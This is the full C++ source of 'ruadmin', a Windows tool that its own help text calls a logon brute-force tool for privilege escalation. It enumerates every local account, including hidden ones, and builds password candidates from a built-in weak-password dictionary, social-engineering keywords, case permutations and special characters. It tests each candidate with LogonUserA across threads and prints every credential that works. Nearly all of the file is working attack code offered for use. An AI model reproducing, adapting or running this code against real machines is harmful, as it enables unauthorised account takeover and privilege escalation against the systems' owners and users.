#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <thread>
#include <mutex>
#include <algorithm>
#include <bitset>
#include <set>
#include <iterator>
#include <windows.h>
#include <lm.h>
#include "builtin_base_passwds.h"

#pragma comment(lib, "netapi32.lib")


using namespace std;

static mutex g_mtx;


// 显示当前暴破进度
static void
showProgress (const unsigned users_total, const unsigned long long passwds_total, const unsigned long long cnt)
{
	const unsigned unit_num = 8; // 显示进度的次数

	static const unsigned long long total = users_total * passwds_total;
	static const unsigned long long unit = total / unit_num;

	if (0 == (cnt % unit)) {
		cout << "--   " << 100 * cnt / total << "%   --" << endl;
	}
}

// wstring 转 string
static const string
wstr2str (const WCHAR* wstr)
{
	int w_nlen = WideCharToMultiByte(CP_ACP, 0, wstr, -1, NULL, 0, NULL, false);
	char* ret = new char[w_nlen];
	memset(ret, 0, w_nlen);
	WideCharToMultiByte(CP_ACP, 0, wstr, -1, ret, w_nlen, NULL, false);
	const string str = string(ret);
	delete [] ret;

	return str;
}

// 从系统中获取有所账号名（转小写），含隐藏账号
static vector<string>
getUsersFromOs (void)
{
	vector<string> users;
	NET_API_STATUS nStatus;
	DWORD dwEntriesRead = 0;
	DWORD dwTotalEntries = 0;
	DWORD dwTotalCount = 0;
	DWORD dwLevel = 0;
	LPUSER_INFO_0 pBuf = NULL;

	do {
		nStatus = NetUserEnum(NULL, 0, FILTER_NORMAL_ACCOUNT, (LPBYTE*)&pBuf, MAX_PREFERRED_LENGTH, &dwEntriesRead, &dwTotalEntries, NULL);
		if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA)) {
			LPUSER_INFO_0 pTmpBuf;
			if ((pTmpBuf = pBuf) != NULL) {
				for (unsigned i = 0; i < dwEntriesRead; ++i) {
					if (pTmpBuf == NULL) {
						cerr << "ERROR! An access violation has occurred. " << endl;
						break;
					}
					string user = wstr2str(pTmpBuf->usri0_name);
					transform(user.begin(), user.end(), user.begin(), ::tolower);
					++pTmpBuf;
					++dwTotalCount;
					if ("guest" == user) // guest 账号没必要暴破
						continue;
					users.push_back(user);
				}
			}
		} else {
			cerr << "ERROR! A system error has occurred: " << nStatus << endl;
		}

		if (pBuf != NULL) {
			NetApiBufferFree(pBuf);
			pBuf = NULL;
		}
	} while (ERROR_MORE_DATA == nStatus);

	if (pBuf != NULL)
		NetApiBufferFree(pBuf);


	return(users);
}

// 提取内置弱口令字典
static const vector<string>&
getBuiltinBasePasswds (void)
{
	return(builtin_base_passwds);  
}

// 读取外部文件
static vector<string>
getLinesFromFile (const string& file_path)
{
	vector<string> lines;

	ifstream file(file_path);
	if (!file) {
		cerr << "ERROR! fail to open \"" << file_path << "\"" << endl;
		return(lines);
	}
	string line;
	while (getline(file, line)) {
		lines.push_back(line);
	}
	file.close();

	return(lines);
}

// 显示帮助信息
static void
showHelp (void)
{
	const string version = "v0.2";
	cout << "  ruadmin (" << version << " @ " << __DATE__ << ") is a logon *Brute Force* tool, for windows "
		    "privilege escalation, but also system management. plz do not use in any illegal purposes. " << endl
		 << endl
	 	 << "  there are some command line options: " << endl
		 << "    * --help: show this summary info of all options. " << endl
		 << "    * --user: by default ruadmin checks all windows OS users (inclue hidden user like yangyangwithgnu$). "
			"this option checks only one user. " << endl
		 << "    * --base-passwds-file: by default ruadmin load built-in base passwds list (about 40,000 chinese and "
			"europe-america and hackers weakness passwds). this option load base passwords from file. " << endl
		 << "    * --se-keywords-file: ruadmin handle base passwds and social engineering keywords, to generate new "
		    "passwds dict. this option load social engineering keywords from file. *attention*, keywords will make "
		    "passwds dict become verrrrrrry huge, so, you'd better set one or two keywords. " << endl
		 << "    * --one-quit: by default ruadmin checks all passwords for all users. this option quit after the "
			"first passwd found for any user. " << endl
		 << endl
		 << "  happy hacking! "
		 << endl;
}

// 显示软件 logo
static void
showLogo (void)
{
	cout << R"(*************************************************************************)" << endl;
	cout << R"(**** not only windows privilege escalation                           ****)" << endl;
	cout << R"(****  ____       _   _         _          _               _          ****)" << endl;
	cout << R"(**** |  _ \     | | | |       / \      __| |  _ __ ___   (_)  _ __   ****)" << endl;
	cout << R"(**** | |_) |    | | | |      / _ \    / _` | | '_ ` _ \  | | | '_ \  ****)" << endl;
	cout << R"(**** |  _ <     | |_| |     / ___ \  | (_| | | | | | | | | | | | | | ****)" << endl;
	cout << R"(**** |_| \_\     \___/     /_/   \_\  \__,_| |_| |_| |_| |_| |_| |_| ****)" << endl;
	cout << R"(****                                                                 ****)" << endl;
	cout << R"(****                         more? touch me yangyangwithgnu@yeah.net ****)" << endl;
	cout << R"(*************************************************************************)" << endl;
	cout << endl;
}

// 以二进制为指示器，对标字符串对应二进制相同位置的数，若为 1 则为大写、0 为小写。
// 比如，字符串为 abcdef，二进制为 110110，那么，生成的字符串为 ABcDEf。
// 注，字符串长度不能超过 n 的类型对应二进制的总位数。
static string
getStrByBin (const string& str, unsigned long long n)
{
	const unsigned bit_total = 8 * sizeof(unsigned long long);

	if (str.size() > bit_total) {
		cerr << "ERROR! str too long. " << endl;
		return("");
	}

	string str_by_bin;
	string str_revserse(str.crbegin(), str.crend());
	bitset<bit_total> n_bit(n);
	for (unsigned i = 0; i < str.size(); ++i) {
		str_by_bin.push_back(n_bit[i] ? toupper(str_revserse[i]) : tolower(str_revserse[i]));
	}
	return(string(str_by_bin.crbegin(), str_by_bin.crend()));
}

// 针对字符串生成大小写排列组合。字母位置保持不变，如 abcd 生成 abcd、abcD、...、ABCD 共 16 种组合。
// 二进制为模型
static vector<string>
getAllLowerAndUpperPermutation (const string& str)
{
	set<string> lower_n_upper_permutation_strs;
	const unsigned long long total = (unsigned long long)pow(2, str.size()); // 排列组合总数
	for (unsigned long long i = 0; i < total; ++i) {
		lower_n_upper_permutation_strs.insert(getStrByBin(str, i));
	}
	return(vector<string>(lower_n_upper_permutation_strs.cbegin(), lower_n_upper_permutation_strs.cend()));
}

// 生成指定字符串的常见大小写排列组合
static vector<string>
getCommonLowerAndUpperPermutation (const string& str)
{
	if (str.empty()) {
		return(vector<string>());
	}

	set<string> common_lower_n_upper_permutation_strs;

	// abcd
	string all_lower_str = str; 
	transform(str.cbegin(), str.cend(), all_lower_str.begin(), ::tolower);
	common_lower_n_upper_permutation_strs.insert(all_lower_str);

	// ABCD
	string all_upper_str = str; 
	transform(str.cbegin(), str.cend(), all_upper_str.begin(), ::toupper);
	common_lower_n_upper_permutation_strs.insert(all_upper_str);

	// AbcD
	string front_n_back_upper_str = all_lower_str; 
	front_n_back_upper_str.front() = toupper(front_n_back_upper_str.front());
	front_n_back_upper_str.back() = toupper(front_n_back_upper_str.back());
	common_lower_n_upper_permutation_strs.insert(front_n_back_upper_str);

	// aBCd
	string front_n_back_lower_str = all_upper_str; 
	front_n_back_lower_str.front() = tolower(front_n_back_lower_str.front());
	front_n_back_lower_str.back() = tolower(front_n_back_lower_str.back());
	common_lower_n_upper_permutation_strs.insert(front_n_back_lower_str);

	// Abcd
	string front_upper_str = all_lower_str; 
	front_upper_str.front() = toupper(front_upper_str.front());
	common_lower_n_upper_permutation_strs.insert(front_upper_str);

	// aBCD
	string front_lower_str = all_upper_str; 
	front_lower_str.front() = tolower(front_lower_str.front());
	common_lower_n_upper_permutation_strs.insert(front_lower_str);

	// abcD
	string back_upper_str = all_lower_str; 
	back_upper_str.back() = toupper(back_upper_str.back());
	common_lower_n_upper_permutation_strs.insert(back_upper_str);

	// ABCd
	string back_lower_str = all_upper_str; 
	back_lower_str.back() = tolower(back_lower_str.back());
	common_lower_n_upper_permutation_strs.insert(back_lower_str);


	return(vector<string>(common_lower_n_upper_permutation_strs.cbegin(), common_lower_n_upper_permutation_strs.cend()));
}

// 暴破指定账号的密码
static void
checkLogon ( unsigned long long& cnt_total, unsigned long long passwds_total, unsigned users_total,
			 const string& user,
			 const vector<string>& lower_n_upper_se_keywords, const vector<string>& special_chars, const vector<string>& base_passwds,
		     vector<pair<string, string>>& logon_users_n_passwds,
			 const BOOL one_quit )
{
	unsigned long long cnt = 0;
	for (const auto& lower_n_upper_se_keyword : lower_n_upper_se_keywords) {
		for (const auto& special_char : special_chars) {
			for (const auto& base_passwd : base_passwds) {
				++cnt;
				if (one_quit && !logon_users_n_passwds.empty()) {
					return;
				}

				const string passwd = lower_n_upper_se_keyword + special_char + base_passwd;

				HANDLE hToken;
				BOOL bret = LogonUserA(user.c_str(), ".", passwd.c_str(), LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &hToken);
				BOOL bfind = ( bret || // 找到非空密码
							   (!bret && ERROR_ACCOUNT_RESTRICTION == GetLastError() && passwd.empty()) ); // 找到空密码 
				if (bfind) {
					g_mtx.lock();
					logon_users_n_passwds.push_back(make_pair(user, passwd));
					cout << "** success **: (" << user << ") / (" << passwd << ") ";
					cnt_total += (passwds_total - cnt - 1); // 已找到正确密码，余下密码没必要再校验，所以同步更改进度
					cout << endl;
					g_mtx.unlock();
				}
				if (hToken != INVALID_HANDLE_VALUE) {
					CloseHandle(hToken);
				}

				g_mtx.lock();
				showProgress(users_total, passwds_total, ++cnt_total);
				g_mtx.unlock();

				if (bfind) {
					return;
				}
			}
		}
	}
}


int
main (int argc, char* argv[])
{
	vector<string> arg_strs;
	for (int i = 1; i < argc; ++i) {
		arg_strs.push_back(argv[i]);
	}
	arg_strs.push_back(""); // 防止后续的 *(++citer) 下溢

	// 显示 logo 信息
	showLogo();

	// 解析 --help 参数
	auto citer = find(arg_strs.cbegin(), arg_strs.cend(), "--help");
	if (arg_strs.cend() != citer) {
		showHelp();
		return(0);
	}
	cout << "O) --help for more info. " << endl;

	// 解析 --user 参数
	string user;
	citer = find(arg_strs.cbegin(), arg_strs.cend(), "--user");
	if (arg_strs.cend() != citer) {
		user = *(++citer);
	}

	// 解析 --base-passwds-file 参数
	string base_passwds_file_path;
	citer = find(arg_strs.cbegin(), arg_strs.cend(), "--base-passwds-file");
	if (arg_strs.cend() != citer) {
		base_passwds_file_path = *(++citer);
	}

	// 解析 --se-keywords-file 参数
	string se_keywords_file_path;
	citer = find(arg_strs.cbegin(), arg_strs.cend(), "--se-keywords-file");
	if (arg_strs.cend() != citer) {
		se_keywords_file_path = *(++citer);
	}

	// 解析 --one-quit 参数
	citer = find(arg_strs.cbegin(), arg_strs.cend(), "--one-quit");
	BOOL one_quit = (arg_strs.cend() != citer);

	// 生成账号列表
	vector<string> users = getUsersFromOs();
	if (!user.empty()) {
		// 指定待暴破的某个账号，若账号不存在，则忽略
		transform(user.begin(), user.end(), user.begin(), ::tolower);
		citer = find(users.cbegin(), users.cend(), user);
		if (users.cend() == citer) {
			cerr << "ERROR! " << user << " is not valid windows OS user. " << endl;
			exit(EXIT_FAILURE);
		}
		users.clear();
		users.push_back(user);
	}
	cout << "l) " << users.size() << " users: ";
	for (const auto& e : users) {
		cout << e << ", ";
	}
	cout << "\b\b. " << endl;

	// 提取基础密码列表
	vector<string> base_passwds;
	if (!base_passwds_file_path.empty()) {
		base_passwds = getLinesFromFile(base_passwds_file_path);
		if (base_passwds.empty()) {
			cerr << "ERROR! there is no any base passwds. " << endl;
			exit(EXIT_FAILURE);
		}
	} else {
		base_passwds = getBuiltinBasePasswds();
	}
	base_passwds.push_back(""); // 空行
	base_passwds.insert(base_passwds.end(), users.cbegin(), users.cend()); // 用户名也作为密码项
	cout << "z) " << base_passwds.size() << " base passwds, " << flush;

	// 提取社工关键字列表
	vector<string> se_keywords;
	if (!se_keywords_file_path.empty()) {
		se_keywords = getLinesFromFile(se_keywords_file_path);
		if (se_keywords.empty()) {
			cerr << "ERROR! there is no any social engineering keyword. " << endl;
			exit(EXIT_FAILURE);
		}
	}
	cout << (se_keywords_file_path.empty() ? 0 : se_keywords.size()) << " social engineering keywords (" << flush;

	// 生成社工关键字大小写排列组合
	vector<string> lower_n_upper_se_keywords;
	lower_n_upper_se_keywords.push_back("");
	if (!se_keywords_file_path.empty()) {
		for (const auto& se_keyword : se_keywords) {
			const auto tmp = getCommonLowerAndUpperPermutation(se_keyword);
			lower_n_upper_se_keywords.insert(lower_n_upper_se_keywords.end(), tmp.cbegin(), tmp.cend());
		}
	}
	cout << lower_n_upper_se_keywords.size() << " common lower-upper permutation). " << flush;

	// 连接社工关键字与基础密码间的特殊字符
	vector<string> special_chars;
	special_chars.push_back("");
	if (!se_keywords_file_path.empty()) {
		special_chars.push_back(R"_(@)_");
		special_chars.push_back(R"_(#)_");
		special_chars.push_back(R"_(-)_");
		special_chars.push_back(R"_(!)_");
		special_chars.push_back(R"_($)_");
		special_chars.push_back(R"_(%)_");
		special_chars.push_back(R"_(=)_");
		special_chars.push_back(R"_(;)_");
		special_chars.push_back(R"_(,)_");
		special_chars.push_back(R"_(.)_");
		special_chars.push_back(R"_(~)_");
		special_chars.push_back(R"_(^)_");
		special_chars.push_back(R"_(&)_");
		special_chars.push_back(R"_(*)_");
		special_chars.push_back(R"_(_)_");
		special_chars.push_back(R"_(:)_");
		special_chars.push_back(R"_(?)_");
		special_chars.push_back(R"_(+)_");
		special_chars.push_back(R"_( )_");
		//special_chars.push_back(R"_(|)_");
		//special_chars.push_back(R"_(/)_");
		//special_chars.push_back(R"_(\)_");
		//special_chars.push_back(R"_(`)_");
		//special_chars.push_back(R"_(')_");
		//special_chars.push_back(R"_(")_");
	}
	const unsigned long long passwds_total = (unsigned long long)lower_n_upper_se_keywords.size() * special_chars.size() * base_passwds.size();
	cout << "so, there are " << passwds_total << " social engineering passwds. " << endl;
	
	// 是否找到一个密码后立即退出
	cout << "e) quit after the first passwd found for any user? " << (one_quit ? "yes. " : "no. ") << endl;


	// 暴破账号密码
	cout << endl;
	cout << ">>>>>>>>>>>>>> here we go. (user) / (passwd), good luck. " << endl;
	vector<pair<string, string>> logon_users_n_passwds;
	unsigned long long cnt_total = 0;
	vector<thread> threads;
	for (const auto& user : users) {
		threads.push_back(thread( checkLogon,
								  ref(cnt_total), passwds_total, users.size(),
								  ref(user), 
								  ref(lower_n_upper_se_keywords), ref(special_chars), ref(base_passwds),
								  ref(logon_users_n_passwds),
								  one_quit ));
	}
	for (auto& e : threads) {
		if (e.joinable()) {
			e.join();
		}
	}	
	cout << "<<<<<<<<<<<<<< that's it. " << logon_users_n_passwds.size() << " passwds in your hands. " << endl;



	return(EXIT_SUCCESS);
}
